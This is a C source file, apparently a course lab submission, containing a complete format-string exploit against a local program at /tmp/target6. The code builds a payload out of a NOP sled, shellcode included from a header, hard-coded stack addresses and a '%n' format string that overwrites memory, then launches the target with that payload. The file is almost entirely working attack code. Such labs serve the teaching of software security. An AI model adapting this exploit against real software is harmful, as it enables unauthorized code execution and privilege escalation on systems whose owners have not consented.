// sploit6.c
// Joseph Ruether
// 07.22.13
// CS645

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target6"

int main(void)
{
   char *args[3];
   char *env[1];

   args[0] = TARGET; 

   // Define constants
   int buffer_size = 256;

   // Define variables
   int shellcode_size = strlen(shellcode);
   int nop_size = buffer_size - shellcode_size;

   printf("%s: %d\n", "Shellcode Size", shellcode_size);
   printf("%s: %d\n", "Nop Sled Size", nop_size);
  
   // Allocate the payload
   args[1] = malloc(buffer_size);

   // Set the payload to all NOP
   memset(args[1], 0x90, buffer_size);
   
   // Set the shellcode
   int i = nop_size;
   int j;
   for(j = 0; j < shellcode_size; ++j, ++i)
   {
      args[1][i] = shellcode[j];
   }

   // Set the printf arguments
   i = 0;

   // Address to write to
   args[1][i++] = '\x8c';
   args[1][i++] = '\xfd';
   args[1][i++] = '\xff';
   args[1][i++] = '\xbf';

   // Value to write
   char value[] = "JUNK";
   memcpy(&args[1][i], &value, strlen(value));
   i += strlen(value);

   // Address to write to
   args[1][i++] = '\x8d';
   args[1][i++] = '\xfd';
   args[1][i++] = '\xff';
   args[1][i++] = '\xbf';

   // Value to write
   memcpy(&args[1][i], &value, strlen(value));
   i += strlen(value);

   // Address to write to
   args[1][i++] = '\x8e';
   args[1][i++] = '\xfd';
   args[1][i++] = '\xff';
   args[1][i++] = '\xbf';

   // Value to write
   memcpy(&args[1][i], &value, strlen(value));
   i += strlen(value);

   // Address to write to
   args[1][i++] = '\x8f';
   args[1][i++] = '\xfd';
   args[1][i++] = '\xff';
   args[1][i++] = '\xbf';

   // Value to write
   char exploit[] = "JUNK%x%08x%08x%n%199x%n%256x%n%192x%n";
   memcpy(&args[1][i], &exploit, strlen(exploit));
   i += strlen(exploit);

   // Terminate the payload
   // args[1][i++] = '\0';

   printf("%s: %d\n", "Printf Argument Size", i);

   args[2] = NULL;
   env[0] = NULL;

   if(0 > execve(TARGET, args, env))
   {
      fprintf(stderr, "execve failed.\n");
   }

  return 0;
}
